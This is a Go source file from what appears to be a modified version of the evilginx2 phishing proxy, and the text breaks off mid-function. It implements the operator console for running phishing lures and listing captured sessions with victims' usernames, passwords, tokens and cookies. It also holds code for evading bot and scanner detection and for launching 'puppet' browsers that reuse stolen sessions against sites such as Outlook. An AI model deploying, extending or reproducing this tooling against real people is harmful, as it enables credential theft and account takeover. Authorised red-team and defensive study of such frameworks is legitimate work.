package core

import (
	"bufio"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

const (
	DEFAULT_PROMPT = ": "
	LAYER_TOP      = 1
)

type Terminal struct {
	rl            *readline.Instance
	completer     *readline.PrefixCompleter
	cfg           *Config
	crt_db        *CertDb
	p             *HttpProxy
	db            *database.Database
	hlp           *Help
	developer     bool
	puppet        *PuppetManager
	analyzer      *Analyzer
	phishletsDir  string
}

func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, puppet *PuppetManager, phishletsDir string) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:          cfg,
		crt_db:       crt_db,
		p:            p,
		db:           db,
		developer:    developer,
		puppet:       puppet,
		phishletsDir: phishletsDir,
	}
	if puppet != nil {
		t.analyzer = NewAnalyzer(puppet)
	}

	t.createHelp()
	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)

	t.rl, err = readline.NewEx(&readline.Config{
		Prompt:              DEFAULT_PROMPT,
		AutoComplete:        t.completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		FuncFilterInputRune: t.filterInput,
	})
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (t *Terminal) Close() {
	t.rl.Close()
}

func (t *Terminal) output(s string, args ...interface{}) {
	out := fmt.Sprintf(s, args...)
	fmt.Fprintf(color.Output, "\n%s\n", out)
}

func (t *Terminal) DoWork() {
	var do_quit = false

	t.checkStatus()
	log.SetReadline(t.rl)

	t.cfg.refreshActiveHostnames()
	t.manageCertificates(true)

	t.output("%s", t.sprintPhishletStatus(""))
	go t.monitorLurePause()

	for !do_quit {
		line, err := t.rl.Readline()
		if err == readline.ErrInterrupt {
			log.Info("type 'exit' in order to quit")
			continue
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)

		args, err := parser.Parse(line)
		if err != nil {
			log.Error("syntax error: %v", err)
		}

		argn := len(args)
		if argn == 0 {
			t.checkStatus()
			continue
		}

		cmd_ok := false
		switch args[0] {
		case "clear":
			cmd_ok = true
			readline.ClearScreen(color.Output)
		case "config":
			cmd_ok = true
			err := t.handleConfig(args[1:])
			if err != nil {
				log.Error("config: %v", err)
			}
		case "proxy":
			cmd_ok = true
			err := t.handleProxy(args[1:])
			if err != nil {
				log.Error("proxy: %v", err)
			}
		case "sessions":
			cmd_ok = true
			err := t.handleSessions(args[1:])
			if err != nil {
				log.Error("sessions: %v", err)
			}
		case "phishlets":
			cmd_ok = true
			err := t.handlePhishlets(args[1:])
			if err != nil {
				log.Error("phishlets: %v", err)
			}
		case "lures":
			cmd_ok = true
			err := t.handleLures(args[1:])
			if err != nil {
				log.Error("lures: %v", err)
			}
		case "blacklist":
			cmd_ok = true
			err := t.handleBlacklist(args[1:])
			if err != nil {
				log.Error("blacklist: %v", err)
			}
		case "notify":
			cmd_ok = true
			err := t.handleNotify(args[1:])
			if err != nil {
				log.Error("notify: %v", err)
			}
		case "api":
			cmd_ok = true
			err := t.handleApi(args[1:])
			if err != nil {
				log.Error("api: %v", err)
			}
		case "botguard":
			cmd_ok = true
			err := t.handleBotguard(args[1:])
			if err != nil {
				log.Error("botguard: %v", err)
			}
		case "puppet":
			cmd_ok = true
			err := t.handlePuppet(args[1:])
			if err != nil {
				log.Error("puppet: %v", err)
			}
		case "test-certs":
			cmd_ok = true
			t.manageCertificates(true)
		case "help":
			cmd_ok = true
			if len(args) == 2 {
				if err := t.hlp.PrintBrief(args[1]); err != nil {
					log.Error("help: %v", err)
				}
			} else {
				t.hlp.Print(0)
			}
		case "q", "quit", "exit":
			do_quit = true
			cmd_ok = true
		default:
			log.Error("unknown command: %s", args[0])
			cmd_ok = true
		}
		if !cmd_ok {
			log.Error("invalid syntax: %s", line)
		}
		t.checkStatus()
	}
}

func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		autocertOnOff := "off"
		if t.cfg.IsAutocertEnabled() {
			autocertOnOff = "on"
		}

		gophishInsecure := "false"
		if t.cfg.GetGoPhishInsecureTLS() {
			gophishInsecure = "true"
		}

		spoofOnOff := "off"
		if t.cfg.IsSpoofEnabled() {
			spoofOnOff = "on"
		}
		botguardOnOff := "off"
		if t.cfg.IsBotguardEnabled() {
			botguardOnOff = "on"
		}
		apiOnOff := "off"
		if t.cfg.IsApiEnabled() {
			apiOnOff = "on"
		}
		htmlObfOnOff := "off"
		if t.cfg.IsHtmlObfuscationEnabled() {
			htmlObfOnOff = "on"
		}

		encKeyDisplay := ""
		if t.cfg.GetEncKey() != "" {
			encKeyDisplay = "***set***"
		}
		apiKeyDisplay := ""
		if t.cfg.GetApiKey() != "" {
			apiKeyDisplay = "***set***"
		}

		hiblue := color.New(color.FgHiCyan)

		// --- General ---
		genKeys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "server_name"}
		genVals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetServerName()}

		jitterOnOff := "off"
		if t.cfg.IsJitterEnabled() {
			jitterOnOff = fmt.Sprintf("on (%d-%d ms)", t.cfg.GetJitterMinMs(), t.cfg.GetJitterMaxMs())
		}
		// --- Security ---
		secKeys := []string{"obfuscation_js", "obfuscation_html", "botguard", "jitter", "encryption_key"}
		secVals := []string{t.cfg.GetJsObfuscationLevel(), htmlObfOnOff, botguardOnOff, jitterOnOff, encKeyDisplay}

		// --- Anti-Detection ---
		adKeys := []string{"spoof", "spoof_url"}
		adVals := []string{spoofOnOff, t.cfg.GetSpoofUrl()}

		// --- REST API ---
		apiKeys := []string{"api", "api_key", "api_secret_path"}
		apiVals := []string{apiOnOff, apiKeyDisplay, t.cfg.GetApiSecretPath()}

		// --- GoPhish Integration ---
		gpKeys := []string{"gophish_admin_url", "gophish_api_key", "gophish_insecure"}
		gpVals := []string{t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}

		log.Printf("\n : %s :", hiblue.Sprint("General"))
		log.Printf("%s", AsRows(genKeys, genVals))
		log.Printf("\n : %s :", hiblue.Sprint("Security"))
		log.Printf("%s", AsRows(secKeys, secVals))
		log.Printf("\n : %s :", hiblue.Sprint("Anti-Detection"))
		log.Printf("%s", AsRows(adKeys, adVals))
		log.Printf("\n : %s :", hiblue.Sprint("REST API"))
		log.Printf("%s", AsRows(apiKeys, apiVals))
		log.Printf("\n : %s :", hiblue.Sprint("GoPhish Integration"))
		log.Printf("%s\n", AsRows(gpKeys, gpVals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "domain":
			t.cfg.SetBaseDomain(args[1])
			t.cfg.ResetAllSites()
			t.manageCertificates(false)
			return nil
		case "ipv4":
			t.cfg.SetServerExternalIP(args[1])
			return nil
		case "unauth_url":
			if len(args[1]) > 0 {
				_, err := url.ParseRequestURI(args[1])
				if err != nil {
					return err
				}
			}
			t.cfg.SetUnauthUrl(args[1])
			return nil
		case "autocert":
			switch args[1] {
			case "on":
				t.cfg.EnableAutocert(true)
				t.manageCertificates(true)
				return nil
			case "off":
				t.cfg.EnableAutocert(false)
				t.manageCertificates(true)
				return nil
			}
		case "spoof":
			switch args[1] {
			case "on":
				t.cfg.SetSpoofEnabled(true)
				return nil
			case "off":
				t.cfg.SetSpoofEnabled(false)
				return nil
			}
		case "spoof_url":
			if len(args[1]) > 0 {
				_, err := url.ParseRequestURI(args[1])
				if err != nil {
					return err
				}
			}
			t.cfg.SetSpoofUrl(args[1])
			return nil
		case "botguard":
			switch args[1] {
			case "on":
				t.cfg.SetBotguardEnabled(true)
				return nil
			case "off":
				t.cfg.SetBotguardEnabled(false)
				return nil
			}
		case "jitter":
			switch args[1] {
			case "on":
				t.cfg.SetJitterEnabled(true)
				return nil
			case "off":
				t.cfg.SetJitterEnabled(false)
				return nil
			}
		case "enc_key":
			if len(args[1]) < 32 {
				log.Warning("key is %d chars - AES-256 requires at least 32 characters. Shorter keys will not enable AES encryption.", len(args[1]))
			}
			if t.cfg.GetEncKey() != "" && t.cfg.GetEncKey() != args[1] {
				log.Warning("changing the encryption key will invalidate ALL existing lure URLs!")
				log.Warning("you will need to regenerate lure URLs with: lures get-url <id>")
			}
			t.cfg.SetEncKey(args[1])
			return nil
		case "server_name":
			t.cfg.SetServerName(args[1])
			return nil
		case "gophish":
			switch args[1] {
			case "test":
				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
				err := t.p.gophish.Test()
				if err != nil {
					log.Error("gophish: %s", err)
				} else {
					log.Success("gophish: connection successful")
				}
				return nil
			}
		}
	} else if pn == 3 {
		switch args[0] {
		case "ipv4":
			switch args[1] {
			case "external":
				t.cfg.SetServerExternalIP(args[2])
				return nil
			case "bind":
				t.cfg.SetServerBindIP(args[2])
				return nil
			}
		case "obfuscation":
			switch args[1] {
			case "javascript", "js":
				t.cfg.SetJsObfuscationLevel(args[2])
				return nil
			case "html":
				switch args[2] {
				case "on":
					t.cfg.SetHtmlObfuscation(true)
					return nil
				case "off":
					t.cfg.SetHtmlObfuscation(false)
					return nil
				}
			}
		case "api":
			switch args[1] {
			case "key":
				t.cfg.SetApiKey(args[2])
				return nil
			case "secret_path":
				t.cfg.SetApiSecretPath(args[2])
				return nil
			}
		case "gophish":
			switch args[1] {
			case "admin_url":
				t.cfg.SetGoPhishAdminUrl(args[2])
				return nil
			case "api_key":
				t.cfg.SetGoPhishApiKey(args[2])
				return nil
			case "insecure":
				switch args[2] {
				case "true":
					t.cfg.SetGoPhishInsecureTLS(true)
					return nil
				case "false":
					t.cfg.SetGoPhishInsecureTLS(false)
					return nil
				}
			}
		}
	}
	return fmt.Errorf("usage: config [domain|ipv4|unauth_url|obfuscation|spoof|enc_key|server_name] <value> (see: help config)")
}

func (t *Terminal) handleBlacklist(args []string) error {
	pn := len(args)
	if pn == 0 {
		mode := t.cfg.GetBlacklistMode()
		ip_num, mask_num := t.p.bl.GetStats()
		log.Info("blacklist mode set to: %s", mode)
		log.Info("blacklist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)

		return nil
	} else if pn == 1 {
		switch args[0] {
		case "all":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "unauth":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "noadd":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "off":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "log":
			switch args[1] {
			case "on":
				t.p.bl.SetVerbose(true)
				log.Info("blacklist log output: enabled")
				return nil
			case "off":
				t.p.bl.SetVerbose(false)
				log.Info("blacklist log output: disabled")
				return nil
			}
		}
	}
	return fmt.Errorf("usage: blacklist [all|<ip>] (see: help blacklist)")
}

func (t *Terminal) handleNotify(args []string) error {
	pn := len(args)
	if pn == 0 {
		// list notifiers
		notifiers := t.cfg.GetNotifiers()
		if len(notifiers) == 0 {
			log.Info("no notifiers configured")
			return nil
		}
		cols := []string{"name", "type", "enabled", "triggers"}
		var rows [][]string
		for _, n := range notifiers {
			enabledStr := "no"
			if n.Enabled {
				enabledStr = "yes"
			}
			rows = append(rows, []string{n.Name, n.Type, enabledStr, strings.Join(n.Triggers, ",")})
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn >= 2 {
		switch args[0] {
		case "create":
			if pn < 3 {
				return fmt.Errorf("usage: notify create <name> <type> [triggers...]")
			}
			name := args[1]
			ntype := args[2]
			validTypes := []string{"webhook", "slack", "pushover", "telegram"}
			if !stringExists(ntype, validTypes) {
				return fmt.Errorf("invalid notifier type: %s (valid: webhook, slack, pushover, telegram)", ntype)
			}
			triggers := []string{"lure_clicked", "credential_captured", "session_captured"}
			if pn > 3 {
				triggers = args[3:]
			}
			n := &NotifierConfig{
				Name:     name,
				Type:     ntype,
				Enabled:  true,
				Triggers: triggers,
				Config:   make(map[string]string),
			}
			t.cfg.AddNotifier(n)
			return nil
		case "delete":
			return t.cfg.DeleteNotifier(args[1])
		case "set":
			if pn < 4 {
				return fmt.Errorf("usage: notify set <name> <key> <value>")
			}
			n, err := t.cfg.GetNotifier(args[1])
			if err != nil {
				return err
			}
			n.Config[args[2]] = args[3]
			t.cfg.SaveNotifiers()
			log.Info("notifier '%s' config '%s' set to: %s", args[1], args[2], args[3])
			return nil
		case "enable":
			n, err := t.cfg.GetNotifier(args[1])
			if err != nil {
				return err
			}
			n.Enabled = true
			t.cfg.SaveNotifiers()
			log.Info("notifier '%s' enabled", args[1])
			return nil
		case "disable":
			n, err := t.cfg.GetNotifier(args[1])
			if err != nil {
				return err
			}
			n.Enabled = false
			t.cfg.SaveNotifiers()
			log.Info("notifier '%s' disabled", args[1])
			return nil
		case "test":
			n, err := t.cfg.GetNotifier(args[1])
			if err != nil {
				return err
			}
			nm := NewNotificationManager(t.cfg)
			err = nm.TestNotifier(n)
			if err != nil {
				return fmt.Errorf("test failed: %v", err)
			}
			log.Success("notifier '%s' test successful", args[1])
			return nil
		}
	}
	return fmt.Errorf("usage: notify [create <name> <type> [triggers]|delete <name>|set <name> <key> <value>|triggers <name> <triggers>|enable <name>|disable <name>|test <name>] (see: help notify)")
}

func (t *Terminal) handleApi(args []string) error {
	pn := len(args)
	if pn == 0 {
		apiOnOff := "off"
		if t.cfg.IsApiEnabled() {
			apiOnOff = "on"
		}
		keys := []string{"enabled", "secret_path", "api_key"}
		apiKeyDisplay := ""
		if t.cfg.GetApiKey() != "" {
			apiKeyDisplay = "***set***"
		}
		vals := []string{apiOnOff, t.cfg.GetApiSecretPath(), apiKeyDisplay}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			if t.cfg.GetApiKey() == "" {
				log.Warning("API key is not set! Set it with: api key <your_key>")
			}
			if t.cfg.GetApiSecretPath() == "" {
				log.Warning("API secret path is not set! Set it with: api secret_path <path>")
				log.Warning("Without a secret path, API requests cannot be routed.")
			}
			t.cfg.SetApiEnabled(true)
			return nil
		case "disable":
			t.cfg.SetApiEnabled(false)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "key":
			t.cfg.SetApiKey(args[1])
			return nil
		case "secret_path":
			t.cfg.SetApiSecretPath(args[1])
			return nil
		}
	}
	return fmt.Errorf("usage: api [enable|disable|key <key>|secret_path <path>]")
}

func (t *Terminal) handleBotguard(args []string) error {
	pn := len(args)
	if pn == 0 {
		bgOnOff := "off"
		if t.cfg.IsBotguardEnabled() {
			bgOnOff = "on"
		}
		jsOnOff := "off"
		if t.cfg.IsBotguardJsChallengeEnabled() {
			jsOnOff = "on"
		}
		keys := []string{"enabled", "js_challenge"}
		vals := []string{bgOnOff, jsOnOff}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable", "on":
			t.cfg.SetBotguardEnabled(true)
			if t.cfg.IsBotguardJsChallengeEnabled() {
				log.Warning("JS challenge is ON - every first-time visitor will see a brief 'Verifying browser...' page.")
				log.Warning("This blocks bots but adds ~1.5s delay for real users on first visit.")
				log.Warning("To disable: botguard js_challenge off")
			}
			return nil
		case "disable", "off":
			t.cfg.SetBotguardEnabled(false)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "js_challenge":
			switch args[1] {
			case "on":
				t.cfg.SetBotguardJsChallenge(true)
				log.Warning("every first-time visitor will see a brief 'Verifying browser...' page before the phishing content.")
				return nil
			case "off":
				t.cfg.SetBotguardJsChallenge(false)
				return nil
			}
		case "block_ja3":
			t.cfg.AddBotguardBlockedJa3(args[1])
			return nil
		}
	}
	return fmt.Errorf("usage: botguard [enable|disable|js_challenge <on|off>|block_ja3 <hash>|unblock_ja3 <hash>] (see: help botguard)")
}

func (t *Terminal) handleProxy(args []string) error {
	pn := len(args)
	if pn == 0 {
		// Show global proxy config
		var proxy_enabled string = "no"
		if t.cfg.proxyConfig.Enabled {
			proxy_enabled = "yes"
		}

		keys := []string{"enabled", "type", "address", "port", "username", "password"}
		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password}
		log.Printf("\n%s\n", AsRows(keys, vals))

		// Show named proxies
		namedProxies := t.cfg.GetNamedProxies()
		if len(namedProxies) > 0 {
			log.Printf("\nNamed Proxies:")
			cols := []string{"name", "type", "address", "port", "username"}
			var rows [][]string
			for _, np := range namedProxies {
				rows = append(rows, []string{np.Name, np.Type, np.Address, strconv.Itoa(np.Port), np.Username})
			}
			log.Printf("\n%s\n", AsTable(cols, rows))
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			// Validate proxy config before enabling
			if t.cfg.proxyConfig.Address == "" {
				return fmt.Errorf("proxy address not configured")
			}
			if t.cfg.proxyConfig.Port == 0 {
				return fmt.Errorf("proxy port not configured")
			}
			t.cfg.EnableProxy(true)
			return nil
		case "disable":
			t.cfg.EnableProxy(false)
			return nil
		case "list":
			namedProxies := t.cfg.GetNamedProxies()
			if len(namedProxies) == 0 {
				log.Info("no named proxies configured")
				return nil
			}
			cols := []string{"name", "type", "address", "port", "username"}
			var rows [][]string
			for _, np := range namedProxies {
				rows = append(rows, []string{np.Name, np.Type, np.Address, strconv.Itoa(np.Port), np.Username})
			}
			log.Printf("\n%s\n", AsTable(cols, rows))
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "create":
			np := &NamedProxy{
				Name: args[1],
				Type: "http",
			}
			return t.cfg.AddNamedProxy(np)
		case "delete":
			return t.cfg.DeleteNamedProxy(args[1])
		case "test":
			np, err := t.cfg.GetNamedProxy(args[1])
			if err != nil {
				return err
			}
			if np.Address == "" || np.Port == 0 {
				return fmt.Errorf("proxy '%s' address or port not configured", np.Name)
			}
			log.Info("testing proxy '%s' (%s://%s:%d)...", np.Name, np.Type, np.Address, np.Port)
			// Build proxy URL and attempt a test connection
			proxyURL := buildProxyURL(np.Type, np.Address, np.Port, np.Username, np.Password)
			transport := &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
			client := &http.Client{Transport: transport, Timeout: 10 * time.Second}
			testResp, err := client.Get("https://www.google.com")
			if err != nil {
				return fmt.Errorf("proxy test failed: %v", err)
			}
			testResp.Body.Close()
			log.Success("proxy '%s' connection test successful (status: %d)", np.Name, testResp.StatusCode)
			return nil
		case "type":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyType(args[1])
			return nil
		case "address":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyAddress(args[1])
			return nil
		case "port":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			port, err := strconv.Atoi(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetProxyPort(port)
			return nil
		case "username":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyUsername(args[1])
			return nil
		case "password":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyPassword(args[1])
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "set":
			// proxy set <name> <key=value>
			np, err := t.cfg.GetNamedProxy(args[1])
			if err != nil {
				return err
			}
			kv := strings.SplitN(args[2], "=", 2)
			if len(kv) != 2 {
				return fmt.Errorf("invalid format, use: proxy set <name> key=value")
			}
			switch kv[0] {
			case "type":
				np.Type = kv[1]
			case "address":
				np.Address = kv[1]
			case "port":
				port, err := strconv.Atoi(kv[1])
				if err != nil {
					return err
				}
				np.Port = port
			case "username":
				np.Username = kv[1]
			case "password":
				np.Password = kv[1]
			default:
				return fmt.Errorf("unknown proxy property: %s", kv[0])
			}
			t.cfg.SaveNamedProxies()
			log.Info("proxy '%s' %s set to: %s", args[1], kv[0], kv[1])
			return nil
		}
	} else if pn == 4 {
		switch args[0] {
		case "set":
			// proxy set <name> <key> <value>
			np, err := t.cfg.GetNamedProxy(args[1])
			if err != nil {
				return err
			}
			switch args[2] {
			case "type":
				np.Type = args[3]
			case "address":
				np.Address = args[3]
			case "port":
				port, err := strconv.Atoi(args[3])
				if err != nil {
					return err
				}
				np.Port = port
			case "username":
				np.Username = args[3]
			case "password":
				np.Password = args[3]
			default:
				return fmt.Errorf("unknown proxy property: %s", args[2])
			}
			t.cfg.SaveNamedProxies()
			log.Info("proxy '%s' %s set to: %s", args[1], args[2], args[3])
			return nil
		}
	}
	return fmt.Errorf("usage: proxy [enable|disable|type|address|port|username|password|test|create|delete|set|list] (see: help proxy)")
}

func (t *Terminal) handleSessions(args []string) error {
	lblue := color.New(color.FgHiBlue)
	dgray := color.New(color.FgHiBlack)
	lgreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	lyellow := color.New(color.FgHiYellow)
	lred := color.New(color.FgHiRed)
	cyan := color.New(color.FgCyan)
	white := color.New(color.FgHiWhite)

	pn := len(args)
	if pn == 0 {
		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		var rows [][]string
		for _, s := range sessions {
			tcol := dgray.Sprintf("none")
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tcol = lgreen.Sprintf("captured")
			}
			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		id, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		s_found := false
		for _, s := range sessions {
			if s.Id == id {
				_, err := t.cfg.GetPhishlet(s.Phishlet)
				if err != nil {
					log.Error("%v", err)
					break
				}

				s_found = true
				tcol := dgray.Sprintf("empty")
				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					tcol = lgreen.Sprintf("captured")
				}

				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
				log.Printf("\n%s\n", AsRows(keys, vals))

				if len(s.Custom) > 0 {
					tkeys := []string{}
					tvals := []string{}

					for k, v := range s.Custom {
						tkeys = append(tkeys, k)
						tvals = append(tvals, cyan.Sprint(v))
					}

					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
				}

				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
						//var str_tokens string

						tkeys := []string{}
						tvals := []string{}

						for k, v := range s.BodyTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}
						for k, v := range s.HttpTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}

						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
					}
					if len(s.CookieTokens) > 0 {
						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
					}
				}
				break
			}
		}
		if !s_found {
			return fmt.Errorf("id %d not found", id)
		}
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			if args[1] == "all" {
				sessions, err := t.db.ListSessions()
				if err != nil {
					return err
				}
				if len(sessions) == 0 {
					break
				}
				for _, s := range sessions {
					err = t.db.DeleteSessionById(s.Id)
					if err != nil {
						log.Warning("delete: %v", err)
					} else {
						log.Info("deleted session with ID: %d", s.Id)
					}
				}
				t.db.Flush()
				return nil
			} else {
				rc := strings.Split(args[1], ",")
				for _, pc := range rc {
					pc = strings.TrimSpace(pc)
					rd := strings.Split(pc, "-")
					if len(rd) == 2 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						for i := b_id; i <= e_id; i++ {
							err = t.db.DeleteSessionById(i)
							if err != nil {
								log.Warning("delete: %v", err)
							} else {
								log.Info("deleted session with ID: %d", i)
							}
						}
					} else if len(rd) == 1 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						err = t.db.DeleteSessionById(b_id)
						if err != nil {
							log.Warning("delete: %v", err)
						} else {
							log.Info("deleted session with ID: %d", b_id)
						}
					}
				}
				t.db.Flush()
				return nil
			}
		}
	}
	return fmt.Errorf("usage: sessions [<id>|delete <id>|delete all] (see: help sessions)")
}

func (t *Terminal) handlePuppet(args []string) error {
	higreen := color.New(color.FgHiGreen)
	cyan := color.New(color.FgCyan)
	yellow := color.New(color.FgYellow)
	white := color.New(color.FgHiWhite)
	dgray := color.New(color.FgHiBlack)
	lred := color.New(color.FgHiRed)
	lblue := color.New(color.FgHiBlue)

	if t.puppet == nil {
		return fmt.Errorf("puppet manager not initialized")
	}

	pn := len(args)
	if pn == 0 || (pn == 1 && args[0] == "list") {
		// List all puppets
		puppets := t.puppet.ListPuppets()
		if len(puppets) == 0 {
			log.Info("no active puppet sessions")
			log.Info("")
			log.Info("%s", dgray.Sprint("  launch a puppet: puppet launch <session_id> <target_url>"))
			log.Info("%s", dgray.Sprint("  example:         puppet launch 5 https://outlook.office.com"))
			return nil
		}

		cols := []string{"id", "session", "phishlet", "username", "target", "status", "started"}
		var rows [][]string
		for _, p := range puppets {
			var statusCol string
			switch p.Status {
			case PUPPET_RUNNING:
				statusCol = higreen.Sprint("running")
			case PUPPET_STARTING:
				statusCol = yellow.Sprint("starting")
			case PUPPET_STOPPED:
				statusCol = dgray.Sprint("stopped")
			case PUPPET_ERROR:
				statusCol = lred.Sprint("error")
			}
			row := []string{
				strconv.Itoa(p.Id),
				strconv.Itoa(p.SessionId),
				lred.Sprint(p.Phishlet),
				lblue.Sprint(truncateString(p.Username, 20)),
				yellow.Sprint(truncateString(p.TargetURL, 40)),
				statusCol,
				p.CreateTime.Format("15:04:05"),
			}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))

		log.Info("%s", dgray.Sprint("  open control panel: puppet url <puppet_id>"))
		return nil
	}

	switch args[0] {
	case "launch":
		if pn < 3 {
			return fmt.Errorf("usage: puppet launch <session_id> <target_url>")
		}
		sessionId, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid session id: %s", args[1])
		}
		targetURL := args[2]

		log.Info("launching puppet browser for session %d -> %s", sessionId, targetURL)

		puppet, err := t.puppet.LaunchPuppet(sessionId, targetURL)
		if err != nil {
			return fmt.Errorf("failed to launch puppet: %v", err)
		}

		log.Success("puppet %s launched (id: %d)", white.Sprint("#"+strconv.Itoa(puppet.Id)), puppet.Id)
		log.Info("")
		log.Info("  %s %s", dgray.Sprint("session:"), lblue.Sprint(strconv.Itoa(puppet.SessionId)))
		log.Info("  %s %s", dgray.Sprint("phishlet:"), lred.Sprint(puppet.Phishlet))
		log.Info("  %s %s", dgray.Sprint("username:"), lblue.Sprint(puppet.Username))
		log.Info("  %s %s", dgray.Sprint("target:"), yellow.Sprint(puppet.TargetURL))
		log.Info("")
		log.Info("  %s %s", dgray.Sprint("the browser is starting. get the control URL with:"), cyan.Sprint("puppet url "+strconv.Itoa(puppet.Id)))
		log.Info("  %s %s", dgray.Sprint("or open the puppet dashboard:"), cyan.Sprint(t.puppet.GetDashboardURL()))
		return nil

	case "kill":
		if pn < 2 {
			return fmt.Errorf("usage: puppet kill <puppet_id|all>")
		}
		if args[1] == "all" {
			killed := t.puppet.KillAllPuppets()
